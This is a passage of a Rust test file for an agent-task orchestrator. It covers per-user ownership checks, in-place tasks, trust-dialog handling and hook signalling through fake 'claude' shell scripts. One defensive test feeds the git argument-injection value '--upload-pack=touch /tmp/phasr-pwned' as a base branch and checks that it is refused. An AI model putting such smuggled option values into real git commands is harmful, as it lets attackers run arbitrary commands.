    /// another account.
    #[tokio::test]
    async fn assert_owner_rejects_another_users_task() {
        let (orchestrator, repositories, pool, _tmp) = fresh_orchestrator().await;
        seed_user(&pool, "user-a").await;
        seed_user(&pool, "user-b").await;
        let repo = Repository::new("r".into(), None, None);
        repositories.insert_for_user(&repo, "user-a").await.unwrap();
        let ws = Workspace::new(repo.id.clone(), "a-task".into(), "c".into());
        WorkspaceRepo::new(pool.clone())
            .insert_for_user(&ws, "user-a")
            .await
            .unwrap();

        let denied = |r: Result<(), OrchestratorError>| {
            matches!(
                r,
                Err(OrchestratorError::Store(crate::store::StoreError::NotFound))
            )
        };

        assert!(denied(orchestrator.assert_owner(&ws.id, "user-b").await));
        orchestrator.assert_owner(&ws.id, "user-a").await.unwrap();
        // Now cached for user-a — user-b is still refused.
        assert!(denied(orchestrator.assert_owner(&ws.id, "user-b").await));
        orchestrator.assert_owner(&ws.id, "user-a").await.unwrap();
        // Non-workspace ids (a bogus id, a run-command PTY key) are refused
        // too: the orchestrator's PTY commands only ever address workspaces.
        assert!(denied(orchestrator.assert_owner("missing", "user-a").await));
        assert!(denied(orchestrator.assert_owner("run:abc", "user-a").await));
    }

    /// `start_task` with a session must not build a worktree in a
    /// repository that belongs to another account.
    #[tokio::test]
    async fn start_task_refuses_another_users_repository() {
        let (orchestrator, repositories, pool, tmp) = fresh_orchestrator().await;
        seed_user(&pool, "user-a").await;
        seed_user(&pool, "user-b").await;
        let repo_dir = tmp.path().join("repo");
        std::fs::create_dir_all(&repo_dir).unwrap();
        init_repo(&repo_dir);
        let repo = Repository::new(
            "a-repo".into(),
            Some(repo_dir.to_string_lossy().into_owned()),
            None,
        );
        repositories.insert_for_user(&repo, "user-a").await.unwrap();

        let mut request = sleep_request(&repo.id, "intrusion");
        request.user_id = Some("user-b".into());
        let err = orchestrator.start_task_and_wait(request).await.unwrap_err();
        assert!(matches!(
            err,
            OrchestratorError::Store(crate::store::StoreError::NotFound)
        ));
        assert_eq!(count_worktrees(&repo_dir), 1, "no worktree may be created");
    }

    // --- Permission modes + in-place (M4) ---

    #[tokio::test]
    async fn start_task_stores_permission_mode_and_notify() {
        let (orchestrator, repositories, _pool, tmp) = fresh_orchestrator().await;
        let repo = repo_with_git(&repositories, &tmp, "repo").await;

        let mut request = sleep_request(&repo.id, "with-mode");
        request.permission_mode = Some(PermissionMode::AskEdits);
        request.notify_on_attention = false;
        let started = orchestrator.start_task_and_wait(request).await.unwrap();
        assert_eq!(
            started.workspace.permission_mode,
            Some(PermissionMode::AskEdits)
        );
        assert!(!started.workspace.notify_on_attention);

        // Persisted, not just echoed.
        let row = orchestrator.workspaces.get(&started.task_id).await.unwrap();
        assert_eq!(row.permission_mode, Some(PermissionMode::AskEdits));
        assert!(!row.notify_on_attention);

        cleanup(&orchestrator, &[&started]).await;
    }

    /// The repository's local workspace, as `ensure_local_workspace`
    /// creates it.
    async fn local_workspace(pool: &crate::store::Db, repo: &Repository) -> Workspace {
        let mut local = Workspace::new(repo.id.clone(), "local".into(), String::new());
        local.workspace_kind = WorkspaceKind::Local;
        local.status = WorkspaceStatus::Stopped;
        local.worktree_path = repo.local_path.clone();
        WorkspaceRepo::new(pool.clone())
            .insert(&local)
            .await
            .unwrap();
        local
    }

    fn in_place_request(repository_id: &str) -> StartTaskRequest {
        let mut request = sleep_request(repository_id, "in place");
        request.run_in = RunIn::InPlace;
        request.permission_mode = Some(PermissionMode::AskShell);
        request.prompt = Some("fix the bug".into());
        request
    }

    #[tokio::test]
    async fn in_place_runs_on_the_local_workspace_without_a_worktree() {
        let (orchestrator, repositories, pool, tmp) = fresh_orchestrator().await;
        let repo = repo_with_git(&repositories, &tmp, "repo").await;
        let repo_path = Path::new(repo.local_path.as_deref().unwrap()).to_path_buf();
        let local = local_workspace(&pool, &repo).await;

        let started = orchestrator
            .start_task_and_wait(in_place_request(&repo.id))
            .await
            .unwrap();
        assert_eq!(started.task_id, local.id, "reuses the local row");
        let row = &started.workspace;
        assert_eq!(row.workspace_kind, WorkspaceKind::Local);
        assert_eq!(row.status, WorkspaceStatus::Running);
        assert_eq!(row.agent, Some(Agent::Claude));
        assert_eq!(row.command, "sleep 30");
        assert_eq!(row.prompt.as_deref(), Some("fix the bug"));
        assert_eq!(row.permission_mode, Some(PermissionMode::AskShell));
        assert_eq!(row.worktree_path, repo.local_path, "runs in the checkout");
        assert!(orchestrator.runtime.get(&local.id).is_some(), "PTY is live");
        assert_eq!(count_worktrees(&repo_path), 1, "no worktree was created");
        assert_eq!(count_phasr_branches(&repo_path), 0);

        // Local rows never sync.
        let dirty: i64 = sqlx::query_scalar("SELECT dirty FROM workspaces WHERE id = ?")
            .bind(&local.id)
            .fetch_one(&pool)
            .await
            .unwrap();
        assert_eq!(dirty, 0);

        orchestrator.quiesce_task(&local.id).await;
    }

    #[tokio::test]
    async fn second_in_place_task_is_rejected_while_one_runs() {
        let (orchestrator, repositories, pool, tmp) = fresh_orchestrator().await;
        let repo = repo_with_git(&repositories, &tmp, "repo").await;
        let local = local_workspace(&pool, &repo).await;

        orchestrator
            .start_task_and_wait(in_place_request(&repo.id))
            .await
            .unwrap();
        let mut second = in_place_request(&repo.id);
        second.agent = Agent::Codex;
        let err = orchestrator.start_task_and_wait(second).await.unwrap_err();
        assert!(
            matches!(err, OrchestratorError::InPlaceTaskRunning),
            "{err:?}"
        );
        assert_eq!(
            err.to_string(),
            "an in-place task is already running in this repository"
        );
        // The running task is untouched.
        let row = orchestrator.workspaces.get(&local.id).await.unwrap();
        assert_eq!(row.agent, Some(Agent::Claude));
        assert_eq!(row.status, WorkspaceStatus::Running);

        // Worktree tasks in the same repository are unaffected.
        let worktree = orchestrator
            .start_task_and_wait(sleep_request(&repo.id, "parallel"))
            .await
            .unwrap();
        assert_eq!(worktree.workspace.workspace_kind, WorkspaceKind::Agent);

        orchestrator.quiesce_task(&local.id).await;
        cleanup(&orchestrator, &[&worktree]).await;
    }

    /// The local workspace's terminal open as a plain shell is taken over by
    /// the agent — and the replaced shell's exit must not report the new
    /// agent as failed or unregister its PTY.
    #[tokio::test]
    async fn in_place_replaces_an_idle_local_shell_without_a_false_failure() {
        let (orchestrator, repositories, pool, tmp) = fresh_orchestrator().await;
        let repo = repo_with_git(&repositories, &tmp, "repo").await;
        let local = local_workspace(&pool, &repo).await;

        // Open the local terminal: a plain shell, row → running, no agent.
        let shell = orchestrator.open_terminal(&local.id, 24, 80).await.unwrap();
        drop(shell);
        let shell_handle = orchestrator.runtime.get(&local.id).unwrap();
        let mut status_rx = orchestrator.subscribe_status();

        let started = orchestrator
            .start_task_and_wait(in_place_request(&repo.id))
            .await
            .unwrap();
        let agent_handle = orchestrator.runtime.get(&local.id).unwrap();
        assert!(
            !Arc::ptr_eq(&shell_handle, &agent_handle),
            "shell was replaced"
        );
        assert_eq!(started.workspace.agent, Some(Agent::Claude));

        // Only the agent's `running` may be broadcast; give the old shell's
        // exit watcher time to misbehave.
        let deadline = tokio::time::Instant::now() + Duration::from_secs(3);
        while tokio::time::Instant::now() < deadline {
            if let Ok(Ok(event)) =
                tokio::time::timeout(Duration::from_millis(200), status_rx.recv()).await
            {
                assert_eq!(event.status, WorkspaceStatus::Running, "got {event:?}");
            }
        }
        let row = orchestrator.workspaces.get(&local.id).await.unwrap();
        assert_eq!(row.status, WorkspaceStatus::Running);
        let still = orchestrator
            .runtime
            .get(&local.id)
            .expect("agent PTY still registered");
        assert!(Arc::ptr_eq(&still, &agent_handle));

        orchestrator.quiesce_task(&local.id).await;
    }

    /// A local row a finished shell left `completed` can still be claimed —
    /// the one-shot task state machine doesn't apply to the local slot.
    #[tokio::test]
    async fn in_place_claims_a_completed_local_row_and_creates_a_missing_one() {
        let (orchestrator, repositories, pool, tmp) = fresh_orchestrator().await;
        let repo = repo_with_git(&repositories, &tmp, "repo").await;
        let local = local_workspace(&pool, &repo).await;
        sqlx::query("UPDATE workspaces SET status = 'completed', exit_code = 0 WHERE id = ?")
            .bind(&local.id)
            .execute(&pool)
            .await
            .unwrap();
        let started = orchestrator
            .start_task_and_wait(in_place_request(&repo.id))
            .await
            .unwrap();
        assert_eq!(started.task_id, local.id);
        assert_eq!(started.workspace.status, WorkspaceStatus::Running);
        assert_eq!(started.workspace.exit_code, None);
        orchestrator.quiesce_task(&local.id).await;

        // A repository with no local row yet gets one.
        let other = repo_with_git(&repositories, &tmp, "other").await;
        let started = orchestrator
            .start_task_and_wait(in_place_request(&other.id))
            .await
            .unwrap();
        assert_eq!(started.workspace.workspace_kind, WorkspaceKind::Local);
        assert_eq!(started.workspace.name, "local");
        assert_eq!(started.workspace.worktree_path, other.local_path);
        orchestrator.quiesce_task(&started.task_id).await;
    }

    /// A base branch is handed to `git fetch` / `worktree add`; one git
    /// would read as an option is refused on input AND at launch (the
    /// stored column syncs from other machines).
    #[tokio::test]
    async fn a_base_branch_that_looks_like_an_option_is_refused() {
        let (orchestrator, repositories, _pool, tmp) = fresh_orchestrator().await;
        let repo = repo_with_git(&repositories, &tmp, "repo").await;
        let evil = "--upload-pack=touch /tmp/phasr-pwned";
        let mut request = sleep_request(&repo.id, "evil");
        request.base_branch = Some(evil.into());
        let err = orchestrator.start_task_and_wait(request).await.unwrap_err();
        assert!(
            matches!(err, OrchestratorError::InvalidBaseBranch(_)),
            "{err}"
        );

        let row = TaskRow {
            repository_id: repo.id.clone(),
            agent: Agent::Claude,
            command: "sleep 30".into(),
            name: "queued-evil".into(),
            prompt: None,
            base_branch: Some(evil.into()),
            permission_mode: None,
            notify_on_attention: true,
            queued: false,
            depends_on: None,
        };
        assert!(matches!(
            orchestrator.create_row(row.clone(), None).await,
            Err(OrchestratorError::InvalidBaseBranch(_))
        ));
        // Arrived via sync (no input validation on that path): launch refuses.
        let mut synced = TaskRow {
            base_branch: None,
            ..row
        };
        synced.name = "synced-evil".into();
        let saved = orchestrator.create_row(synced, None).await.unwrap();
        sqlx::query("UPDATE workspaces SET base_branch = ? WHERE id = ?")
            .bind(evil)
            .bind(&saved.id)
            .execute(orchestrator.workspaces.pool())
            .await
            .unwrap();
        assert!(matches!(
            orchestrator.launch(&saved.id, None, None, None).await,
            Err(OrchestratorError::InvalidBaseBranch(_))
        ));
    }

    #[tokio::test]
    async fn send_message_reaches_the_task_and_requires_a_live_pty() {
        let (orchestrator, repositories, _pool, tmp) = fresh_orchestrator().await;
        let repo = repo_with_git(&repositories, &tmp, "repo").await;
        let err = orchestrator
            .send_message("missing", "hi", true)
            .await
            .unwrap_err();
        assert!(matches!(err, OrchestratorError::TaskNotRunning(_)));

        let mut request = sleep_request(&repo.id, "echo-back");
        // Announces it's reading (`rea%s` so the shell's echo of the typed
        // line can't match), reads one line and echoes it with a marker —
        // proving the text was delivered AND submitted. Run as its own
        // process (like a real agent): with the shell itself in the
        // foreground, `send_message` refuses ("agent not running").
        request.command =
            r#"sh -c 'printf "rea%s\n" dy; IFS= read -r line; echo "got[$line]"'"#.into();
        let started = orchestrator.start_task_and_wait(request).await.unwrap();
        let handle = orchestrator.runtime.get(&started.task_id).unwrap();
        let (replay, mut rx) = handle.subscribe_with_replay();
        let mut output = String::new();
        for event in replay {
            if let PtyEvent::Output { chunk, .. } = event {
                output.push_str(&String::from_utf8_lossy(&chunk));
            }
        }
        let deadline = tokio::time::Instant::now() + Duration::from_secs(15);
        while !output.contains("ready") {
            assert!(
                tokio::time::Instant::now() < deadline,
                "never ready; output: {output:?}"
            );
            if let Ok(Ok(PtyEvent::Output { chunk, .. })) =
                tokio::time::timeout(Duration::from_millis(200), rx.recv()).await
            {
                output.push_str(&String::from_utf8_lossy(&chunk));
            }
        }
        orchestrator
            .send_message(&started.task_id, "hello agent", true)
            .await
            .unwrap();

        while !output.contains("got[hello agent]") {
            assert!(
                tokio::time::Instant::now() < deadline,
                "no echo; output: {output:?}"
            );
            match tokio::time::timeout(Duration::from_millis(200), rx.recv()).await {
                Ok(Ok(PtyEvent::Output { chunk, .. })) => {
                    output.push_str(&String::from_utf8_lossy(&chunk))
                }
                _ => continue,
            }
        }
        cleanup(&orchestrator, &[&started]).await;
    }

    /// A stand-in `claude` that behaves like the real one where phasr cares:
    /// reads `--settings`, runs the hook command from it through a shell
    /// with JSON on stdin (exactly how Claude runs command hooks), takes its
    /// prompt after a TUI takeover, and blocks on a single keystroke for its
    /// "permission dialog". On `--resume` it only announces the session.
    const FAKE_CLAUDE: &str = r#"#!/bin/sh
settings=""; resume=""
while [ $# -gt 0 ]; do
  case "$1" in
    --settings) settings="$2"; shift 2 ;;
    --resume) resume="$2"; shift 2 ;;
    *) shift ;;
  esac
done
cmd=$(sed -n 's/.*"command": *"\(.*\)",*$/\1/p' "$settings" | head -n 1)
emit() { printf '%s' "$1" | eval "$cmd"; }
sid=11111111-2222-4333-8444-555555555555
printf '\033[?1049h'
echo "fake-claude resume=[$resume]"
emit "{\"hook_event_name\":\"SessionStart\",\"session_id\":\"$sid\",\"transcript_path\":\"/t.jsonl\",\"source\":\"startup\"}"
if [ -n "$resume" ]; then sleep 30; exit 0; fi
read -r prompt
echo "got-prompt:[$prompt]"
emit "{\"hook_event_name\":\"UserPromptSubmit\",\"session_id\":\"$sid\",\"prompt\":\"p\"}"
emit "{\"hook_event_name\":\"PreToolUse\",\"session_id\":\"$sid\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"pnpm test\"},\"tool_use_id\":\"t1\"}"
emit "{\"hook_event_name\":\"Notification\",\"session_id\":\"$sid\",\"notification_type\":\"permission_prompt\",\"message\":\"Claude needs your permission to use Bash\"}"
stty -icanon -echo min 1
key=$(dd bs=1 count=1 2>/dev/null)
stty icanon echo
echo "got-answer:[$key]"
emit "{\"hook_event_name\":\"PostToolUse\",\"session_id\":\"$sid\",\"tool_name\":\"Bash\"}"
emit "{\"hook_event_name\":\"Stop\",\"session_id\":\"$sid\",\"stop_hook_active\":false,\"last_assistant_message\":\"Tests pass.\"}"
sleep 30
"#;

    async fn orchestrator_with_signals() -> (
        TaskOrchestrator,
        AgentSignals,
        RepositoryRepo,
        WorkspaceRepo,
        tempfile::TempDir,
    ) {
        use crate::agent_signals::transcripts::TranscriptRoots;
        use crate::agent_signals::SignalsConfig;
        let dir = tempfile::tempdir().unwrap();
        let pool = init_pool(&dir.path().join("test.sqlite")).await.unwrap();
        let workspaces = WorkspaceRepo::new(pool.clone());
        let repositories = RepositoryRepo::new(pool.clone());
        let signals = AgentSignals::new(
            SignalsConfig {
                // A space, like the real "Application Support".
                app_data_dir: dir.path().join("App Support"),
                roots: TranscriptRoots {
                    claude_projects: dir.path().join("claude/projects"),
                    codex_sessions: dir.path().join("codex/sessions"),
                },
                codex_config: dir.path().join("codex/config.toml"),
            },
            workspaces.clone(),
            crate::store::TaskUsageRepo::new(pool),
        );
        signals.start();
        let orchestrator = TaskOrchestrator::new(
            workspaces.clone(),
            repositories.clone(),
            Arc::new(TaskRuntime::new(dir.path().join("logs"))),
            Arc::new(RepoLockRegistry::new()),
        )
        .with_agent_signals(signals.clone());
        (orchestrator, signals, repositories, workspaces, dir)
    }

    fn collect_output(rx: &mut broadcast::Receiver<PtyEvent>, into: &mut String) {
        while let Ok(event) = rx.try_recv() {
            if let PtyEvent::Output { chunk, .. } = event {
                into.push_str(&String::from_utf8_lossy(&chunk));
            }
        }
    }

    async fn wait_for<F: FnMut() -> bool>(what: &str, mut done: F) {
        let deadline = std::time::Instant::now() + Duration::from_secs(20);
        while !done() {
            assert!(
                std::time::Instant::now() < deadline,
                "timed out waiting for {what}"
            );
            tokio::time::sleep(Duration::from_millis(50)).await;
        }
    }

    /// End to end: a fake `claude` fires real hooks through the installed
    /// script; the registry turns them into "needs you"; a stale answer
    /// types nothing; a current one types the approval key; Stop stamps the
    /// turn end; and re-opening the stopped task resumes the recorded
    /// session without re-sending the prompt.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn fake_claude_hooks_drive_needs_you_approval_and_resume() {
        use crate::agent_signals::state::{AgentStateKind, AttentionKind};
        let (orchestrator, signals, repositories, workspaces, tmp) =
            orchestrator_with_signals().await;
        let repo = repo_with_git(&repositories, &tmp, "repo").await;
        let fake = tmp.path().join("bin").join("claude");
        std::fs::create_dir_all(fake.parent().unwrap()).unwrap();
        std::fs::write(&fake, FAKE_CLAUDE).unwrap();
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&fake, std::fs::Permissions::from_mode(0o755)).unwrap();
        }

        let mut request = sleep_request(&repo.id, "fake claude");
        request.command = format!("'{}' --permission-mode acceptEdits", fake.display());
        request.prompt = Some("do the thing".into());
        let started = orchestrator.start_task_and_wait(request).await.unwrap();
        let task_id = started.task_id.clone();
        // The stored command stays clean: hook extras are spawn-time only.
        assert!(!started.workspace.command.contains("--settings"));

        let handle = orchestrator.runtime.get(&task_id).unwrap();
        let (replay, mut rx) = handle.subscribe_with_replay();
        let mut out = String::new();
        for event in replay {
            if let PtyEvent::Output { chunk, .. } = event {
                out.push_str(&String::from_utf8_lossy(&chunk));
            }
        }

        wait_for("needs-you", || {
            signals
                .state(&task_id)
                .is_some_and(|s| s.state == AgentStateKind::NeedsYou)
        })
        .await;
        collect_output(&mut rx, &mut out);
        assert!(out.contains("got-prompt:[do the thing]"), "{out}");
        let state = signals.state(&task_id).unwrap();
        let attention = state.attention.unwrap();
        assert_eq!(attention.kind, AttentionKind::Shell);
        assert_eq!(attention.detail.as_deref(), Some("pnpm test"));
        assert!(attention.can_respond);
        assert_eq!(state.last_activity.as_deref(), Some("Running pnpm test"));

        // Stale id → error, and NOTHING reaches the PTY.
        let err = orchestrator
            .respond_to_attention(&task_id, "not-the-current-id", AttentionResponse::AllowOnce)
            .await
            .unwrap_err();
        assert_eq!(err.to_string(), "stale attention");
        tokio::time::sleep(Duration::from_millis(800)).await;
        collect_output(&mut rx, &mut out);
        assert!(
            !out.contains("got-answer"),
            "a stale respond typed something: {out}"
        );

        orchestrator
            .respond_to_attention(&task_id, &attention.id, AttentionResponse::AllowOnce)
            .await
            .unwrap();
        wait_for("answer", || {
            collect_output(&mut rx, &mut out);
            out.contains("got-answer:[1]")
        })
        .await;
        wait_for("idle after Stop", || {
            signals
                .state(&task_id)
                .is_some_and(|s| s.state == AgentStateKind::Idle && s.last_turn_ended_at.is_some())
        })
        .await;
        assert_eq!(
            workspaces
                .get_agent_session_id(&task_id)
                .await
                .unwrap()
                .as_deref(),
            Some("11111111-2222-4333-8444-555555555555")
        );
        assert!(workspaces
            .get(&task_id)
            .await
            .unwrap()
            .last_turn_ended_at
            .is_some());

        // Stop, wait for the PTY to go, then re-open: resume, no prompt.
        orchestrator.stop_task(&task_id).await.unwrap();
        wait_for("pty exit", || orchestrator.runtime.get(&task_id).is_none()).await;
        let sub = orchestrator.open_terminal(&task_id, 24, 80).await.unwrap();
        let mut rx = sub.rx;
        let mut resumed = String::new();
        wait_for("resume", || {
            collect_output(&mut rx, &mut resumed);
            resumed.contains("fake-claude resume=[11111111-2222-4333-8444-555555555555]")
        })
        .await;
        tokio::time::sleep(Duration::from_millis(1500)).await;
        collect_output(&mut rx, &mut resumed);
        assert!(
            !resumed.contains("do the thing"),
            "prompt re-sent on resume: {resumed}"
        );
        assert!(
            resumed.contains("--resume 11111111-2222-4333-8444-555555555555"),
            "{resumed}"
        );

        orchestrator.quiesce_task(&task_id).await;
        assert!(signals.state(&task_id).is_none());
        cleanup(&orchestrator, &[&started]).await;
    }

    /// A stand-in `claude` that opens on the REAL 2.1.319 folder-trust
    /// dialog (the captured fixture, "No, exit" focused), then reads raw
    /// keys until Enter (or a lone key followed by a 1s pause). Down+Enter
    /// = trusted: it clears the screen, shows a composer and reads one
    /// prompt line. Anything else = "No, exit": it quits. `got-keys` shows
    /// EXACTLY which bytes reached the dialog, so a prompt typed into it
    /// would be visible there.
    fn fake_trust_claude(tmp: &tempfile::TempDir) -> PathBuf {
        let fixture = concat!(
            env!("CARGO_MANIFEST_DIR"),
            "/src/agent_signals/fixtures/claude-2.1.319-trust.ansi"
        );
        let script = format!(
            r#"#!/bin/sh
cat '{fixture}'
stty -icanon -echo -icrnl min 0 time 10
keys=""
while :; do
  k=$(dd bs=1 count=1 2>/dev/null | od -An -tx1 | tr -d ' \n')
  if [ -z "$k" ]; then [ -n "$keys" ] && break; continue; fi
  keys="$keys$k"
  [ "$k" = "0d" ] && break
done
stty icanon echo icrnl
echo "got-keys:[$keys]"
if [ "$keys" = "1b5b420d" ]; then
  printf '\033[2J\033[H\033[?25l> '
  IFS= read -r prompt
  echo "got-prompt:[$prompt]"
  sleep 30
fi
exit 1
"#
        );
        let fake = tmp.path().join("bin").join("claude");
        std::fs::create_dir_all(fake.parent().unwrap()).unwrap();
        std::fs::write(&fake, script).unwrap();
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&fake, std::fs::Permissions::from_mode(0o755)).unwrap();
        fake
    }

    /// Start the fake trust-dialog claude with a prompt and wait for its
    /// "Trust this folder?" card.
    async fn start_at_trust_dialog(
        orchestrator: &TaskOrchestrator,
        signals: &AgentSignals,
        repositories: &RepositoryRepo,
        tmp: &tempfile::TempDir,
    ) -> (
        StartedTask,
        crate::agent_signals::state::Attention,
        broadcast::Receiver<PtyEvent>,
        String,
    ) {
        use crate::agent_signals::state::{AgentStateKind, AttentionKind};
        let repo = repo_with_git(repositories, tmp, "repo").await;
        let fake = fake_trust_claude(tmp);
        let mut request = sleep_request(&repo.id, "trust me");
        request.command = format!("'{}' --permission-mode acceptEdits", fake.display());
        request.prompt = Some("do the thing".into());
        let started = orchestrator.start_task_and_wait(request).await.unwrap();
        let task_id = started.task_id.clone();
        let handle = orchestrator.runtime.get(&task_id).unwrap();
        let (replay, rx) = handle.subscribe_with_replay();
        let mut out = String::new();
        for event in replay {
            if let PtyEvent::Output { chunk, .. } = event {
                out.push_str(&String::from_utf8_lossy(&chunk));
            }
        }
        wait_for("trust card", || {
            signals.state(&task_id).is_some_and(|s| {
                s.state == AgentStateKind::NeedsYou
                    && s.attention
                        .as_ref()
                        .is_some_and(|a| a.kind == AttentionKind::Trust)
            })
        })
        .await;
        let attention = signals.state(&task_id).unwrap().attention.unwrap();
        (started, attention, rx, out)
    }

    /// The trust dialog holds the initial prompt: a card (kind `trust`,
    /// detail = the worktree) instead of keystrokes; "allow" sends
    /// Down+Enter, and only then is the prompt typed and submitted — once.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn trust_dialog_holds_the_prompt_until_allowed_then_types_it_once() {
        let (orchestrator, signals, repositories, _workspaces, tmp) =
            orchestrator_with_signals().await;
        let (started, attention, mut rx, mut out) =
            start_at_trust_dialog(&orchestrator, &signals, &repositories, &tmp).await;
        assert_eq!(attention.title, "Trust this folder?");
        assert_eq!(attention.detail, started.workspace.worktree_path);
        assert!(attention.can_respond);

        // Held: well past every typing deadline, nothing reached the dialog.
        tokio::time::sleep(Duration::from_millis(2500)).await;
        collect_output(&mut rx, &mut out);
        assert!(
            !out.contains("got-keys"),
            "something was typed into the trust dialog: {out}"
        );

        orchestrator
            .respond_to_attention(
                &started.task_id,
                &attention.id,
                AttentionResponse::AllowTask,
            )
            .await
            .unwrap();
        wait_for("prompt submitted", || {
            collect_output(&mut rx, &mut out);
            out.contains("got-prompt:")
        })
        .await;
        assert!(
            out.contains("got-keys:[1b5b420d]"),
            "trust answered with the wrong keys: {out}"
        );
        tokio::time::sleep(Duration::from_millis(1500)).await;
        collect_output(&mut rx, &mut out);
        assert_eq!(out.matches("got-prompt:").count(), 1, "{out}");
        assert!(out.contains("got-prompt:[do the thing]"), "{out}");

        orchestrator.quiesce_task(&started.task_id).await;
        cleanup(&orchestrator, &[&started]).await;
    }

    /// "Deny" answers the dialog with Esc ("No, exit"); the prompt is
    /// dropped — never typed into the shell the agent quit to.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn trust_dialog_denied_exits_without_typing_the_prompt() {
        let (orchestrator, signals, repositories, _workspaces, tmp) =
            orchestrator_with_signals().await;
        let (started, attention, mut rx, mut out) =
            start_at_trust_dialog(&orchestrator, &signals, &repositories, &tmp).await;
        orchestrator
            .respond_to_attention(&started.task_id, &attention.id, AttentionResponse::Deny)
            .await
            .unwrap();
        wait_for("dialog answered", || {
            collect_output(&mut rx, &mut out);
            out.contains("got-keys:")
        })
        .await;
        assert!(out.contains("got-keys:[1b]"), "{out}");
        tokio::time::sleep(Duration::from_millis(4000)).await;
        collect_output(&mut rx, &mut out);
        assert!(!out.contains("got-prompt"), "{out}");
        assert!(
            !out.contains("do the thing"),
            "prompt typed after a deny: {out}"
        );

        orchestrator.quiesce_task(&started.task_id).await;
        cleanup(&orchestrator, &[&started]).await;
    }

    #[test]
    fn interpolate_for_task_substitutes_prompt() {
        let out = interpolate_for_task(r#"claude -p "{{prompt}}""#, Some("hi"));
        // Always single-quoted (closing/reopening the template's "…").
        assert_eq!(out, r#"claude -p ""'hi'"""#);
    }

    #[test]
    fn interpolate_for_task_returns_template_when_no_placeholder() {
        let out = interpolate_for_task("claude --dangerously-skip-permissions", None);
        assert_eq!(out, "claude --dangerously-skip-permissions");
    }

    #[test]
    fn interpolate_for_task_handles_missing_prompt_as_empty() {
        let out = interpolate_for_task(r#"agent --p "{{prompt}}""#, None);
        assert_eq!(out, r#"agent --p ""''"""#);
    }

    // ---- review-3 launch rules ----------------------------------------

    fn draft_row(repository_id: &str, name: &str) -> TaskRow {
        TaskRow {
            repository_id: repository_id.to_string(),
            agent: Agent::Claude,
            command: "sleep 30".into(),
            name: name.to_string(),
            prompt: None,
            base_branch: None,
            permission_mode: None,
            notify_on_attention: true,
            queued: false,
            depends_on: None,
        }
    }

    /// New #1: "Start now" (and opening the terminal) while the first
    /// launch is still in its after-create hook. The row shows as Running,
    /// not a Draft; a second start is a no-op; the terminal refuses rather
    /// than spawning beside the hook; exactly one agent starts afterwards
    /// and it is NOT marked exited by a second, failed spawn.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn start_now_during_setup_launches_the_agent_exactly_once() {
        use crate::agent_signals::state::AgentStateKind;
        use crate::domain::board::{derive_lane, Lane};
        let (orchestrator, signals, repositories, workspaces, tmp) =
            orchestrator_with_signals().await;
        let repo = repo_with_git(&repositories, &tmp, "repo").await;
        let gate = tmp.path().join("GO");
        let configs = crate::store::RepositoryConfigRepo::new(workspaces.pool().clone());
        let mut cfg = configs.get(&repo.id).await.unwrap();
        cfg.pre_task_hook = Some(format!(
            "while [ ! -f '{}' ]; do sleep 0.05; done",
            gate.display()
        ));
        configs.upsert(&cfg, None).await.unwrap();
        let orchestrator = orchestrator.with_task_config(TaskConfig::new(
            configs,
            crate::store::SettingsRepo::new(workspaces.pool().clone()),
            None,
        ));
        let draft = orchestrator
            .create_row(draft_row(&repo.id, "slow setup"), None)
            .await
            .unwrap();

        let first = tokio::spawn({
            let orchestrator = orchestrator.clone();
            let id = draft.id.clone();
            async move { orchestrator.launch(&id, None, None, None).await }
        });
        // The window: branch cut, row still `pending`, hook running.
        let deadline = std::time::Instant::now() + Duration::from_secs(20);
        loop {
            if workspaces.get(&draft.id).await.unwrap().branch.is_some() {
                break;
            }
            assert!(
                std::time::Instant::now() < deadline,
                "setup never cut the branch"
            );
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
        assert!(orchestrator.is_starting(&draft.id));
        let row = workspaces.get(&draft.id).await.unwrap();
        assert_eq!(row.status, WorkspaceStatus::Pending);
        let phase = signals
            .states()
            .into_iter()
            .find(|s| s.task_id == draft.id)
            .map(|s| s.state.into());
        assert_eq!(
            derive_lane(&row, phase, None),
            Some(Lane::Running),
            "never a Draft with Start now"
        );

        let again = orchestrator
            .launch(&draft.id, None, None, None)
            .await
            .unwrap();
        assert_eq!(again.task_id, draft.id);
        assert!(
            orchestrator.runtime.get(&draft.id).is_none(),
            "the second start spawned nothing"
        );
        assert!(matches!(
            orchestrator.open_terminal(&draft.id, 24, 80).await,
            Err(OrchestratorError::Starting)
        ));
        assert_eq!(
            OrchestratorError::Starting.to_string(),
            "this task is still being set up; its agent starts when setup finishes"
        );
        assert!(
            orchestrator.runtime.get(&draft.id).is_none(),
            "opening the terminal spawned nothing"
        );

        std::fs::write(&gate, "").unwrap();
        let started = first.await.unwrap().unwrap();
        assert_eq!(started.workspace.status, WorkspaceStatus::Running);
        assert!(!orchestrator.is_starting(&draft.id));
        assert!(orchestrator.runtime.get(&draft.id).is_some());
        assert_eq!(
            signals.state(&draft.id).unwrap().state,
            AgentStateKind::Working
        );
        assert_eq!(
            count_phasr_branches(Path::new(repo.local_path.as_deref().unwrap())),
            1
        );
        // Attaching now is an attach, not a second agent.
        let before = orchestrator.runtime.get(&draft.id).unwrap();
        orchestrator.open_terminal(&draft.id, 24, 80).await.unwrap();
        assert!(Arc::ptr_eq(
            &before,
            &orchestrator.runtime.get(&draft.id).unwrap()
        ));
        orchestrator.quiesce_task(&draft.id).await;
        cleanup(&orchestrator, &[&started]).await;
    }

    /// Opening a terminal resumes only a task that ran before. A legacy
    /// pre-created workspace (or a setup an app quit interrupted) is
    /// started by `launch`; and an agent row without a worktree here never
    /// falls back to the repository's own checkout (the rollback hole).
    #[tokio::test]
    async fn open_terminal_never_starts_an_unstarted_row_or_runs_in_the_checkout() {
        let (orchestrator, repositories, _pool, tmp) = fresh_orchestrator().await;
        let repo = repo_with_git(&repositories, &tmp, "repo").await;
        let repo_path = PathBuf::from(repo.local_path.clone().unwrap());

        let draft = orchestrator
            .create_row(draft_row(&repo.id, "draft"), None)
            .await
            .unwrap();
        assert!(matches!(
            orchestrator.open_terminal(&draft.id, 24, 80).await,
            Err(OrchestratorError::NotStarted)
        ));

        let mut legacy = Workspace::new(repo.id.clone(), "legacy".into(), "sleep 30".into());
